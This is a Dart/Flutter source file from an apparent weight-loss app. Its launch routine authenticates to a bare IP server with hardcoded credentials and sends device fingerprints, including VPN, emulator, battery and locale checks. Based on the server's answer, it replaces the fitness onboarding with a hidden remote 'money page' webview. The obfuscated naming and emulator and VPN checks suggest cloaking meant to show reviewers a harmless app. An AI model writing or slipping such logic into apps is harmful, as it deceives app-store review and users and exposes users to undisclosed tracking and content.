// ignore_for_file: use_build_context_synchronously

import 'dart:developer';
import 'package:dio/dio.dart';
import 'package:flutter/material.dart';
import 'package:in_app_review/in_app_review.dart';
import 'package:onesignal_flutter/onesignal_flutter.dart';
import 'package:weightburner_119/burner/burner_local_model.dart';
import 'package:weightburner_119/burner/burner_money_page.dart';
import 'package:weightburner_119/burner/burner_provider.dart';
import 'package:weightburner_119/burner/burner_response_object.dart';
import 'package:weightburner_119/core/urls.dart';
import 'package:weightburner_119/onbording/onbording_clnjsdsdv.dart';
import 'burner_authorization.dart';
import 'burner_funcii.dart';

Future<void> yyyyyyyy(
    BuildContext context, Function(bool) isPhotoburner) async {
  final burnerDb = await BurnerRepository().burnerHGet();
  if (burnerDb == null) {
    final String? authKey = await burnerAuthorization(
      addPath: 'http://159.89.248.76/api/token/',
      l: 'oauth',
      p: '5.{r8<tWc>!Y2E3',
    );
    if (authKey != null) {
      final burnerprxTemp = await burnerIsUsingVpn();
      final burnerloc = await burnerCountryCode();
      final burnerisEmul = await burnerIsSemulator(context);
      final burnerbtrLevel = await burnerBatteryLevel();
      final burnerisZarayd = await burnerIsCharging();
      const burnerisSim = true;
      final burnerDate = await burnerGetTime();
      try {
        BurnerResponse? burnerResponse;

        final userRegistrationResponse = await Dio(
          BaseOptions(
            headers: {'Authorization': 'Bearer $authKey'},
          ),
        ).post(
          'http://159.89.248.76/api/ads_request/',
          data: {
            "bundle_name": "inc.weight.burner",
            "timestamp": burnerDate,
            "locale": burnerloc,
            "prx_temp": burnerprxTemp,
            "emul_temp": burnerisEmul,
            "battery_temp": burnerisZarayd,
            "mnostate_temp": burnerisSim,
            "btry_temp": burnerbtrLevel,
          },
        );
        if (userRegistrationResponse.data != null) {
          burnerResponse =
              BurnerResponse.fromJson(userRegistrationResponse.data);
        }

        if (burnerResponse != null) {
          if (burnerResponse.boolValue) {
            String burnerL1 =
                '${burnerResponse.burnerResponseObject.rev}${burnerResponse.burnerResponseObject.pvr}';
            final oneSignalSubscriptionId = OneSignal.User.pushSubscription.id;
            if (burnerL1.contains('{click_id}')) {
              burnerL1 = burnerL1.replaceAll(
                  '{click_id}', '$oneSignalSubscriptionId:${DocFF.signalchik}');
            }
            late BurnerLocalModel burnerHiveObject;
            burnerHiveObject = BurnerLocalModel(
              regburner: burnerL1,
              logburner: burnerL1,
              strtburner: true,
              cabburner: '',
            );
            BurnerRepository().burnerHSet(burnerHiveObject);
            isPhotoburner(true);
            await burnerDelayed(3);
            burnerPushReplacement(
              context,
              BurnerMoneyPage(
                link: burnerHiveObject.regburner,
                cache: false,
              ),
            );
            burnerCallReview(10);

            return;
          }
        }
      } catch (e) {
        throw Exception(e);
      }
    }
    isPhotoburner(false);
    await burnerDelayed(3);
    burnerPushReplacement(context, const OnbordingLajbcascas());
    BurnerRepository().burnerHSet(
      BurnerLocalModel(
          regburner: '', logburner: '', strtburner: false, cabburner: ''),
    );
    burnerCallReview(10);
  } else {
    if (burnerDb.strtburner) {
      isPhotoburner(true);
      await burnerDelayed(3);
      if (burnerDb.cabburner.isNotEmpty) {
        log("Cache URL: ${burnerDb.cabburner}");
        burnerPushReplacement(
            context,
            BurnerMoneyPage(
              link: burnerDb.cabburner,
              cache: true,
            ));
      } else {
        burnerPushReplacement(
            context,
            BurnerMoneyPage(
              link: burnerDb.logburner,
              cache: true,
            ));
      }
    } else {
      isPhotoburner(false);
      await burnerDelayed(3);
      burnerPushReplacement(
        context,
        const OnbordingLajbcascas(),
      );
    }
  }
}

Future<void> burnerCallReview(int duration) async {
  await Future.delayed(Duration(seconds: duration));
  try {
    final InAppReview inAppReview = InAppReview.instance;

    if (await inAppReview.isAvailable()) {
      inAppReview.requestReview();
    }
  } catch (e) {
    throw Exception(e);
  }
}

void burnerPushReplacement(BuildContext context, Widget screen) {
  Navigator.pushReplacement(
    context,
    MaterialPageRoute(builder: (_) => screen),
  );
}

Future<String> burnerGetRealLink(String burnerUrl) async {
  final burnerRealLink = await Dio().get(burnerUrl);

  return burnerRealLink.realUri.toString();
}

Future<void> burnerDelayed(int seconds) async {
  await Future.delayed(Duration(seconds: seconds));
}
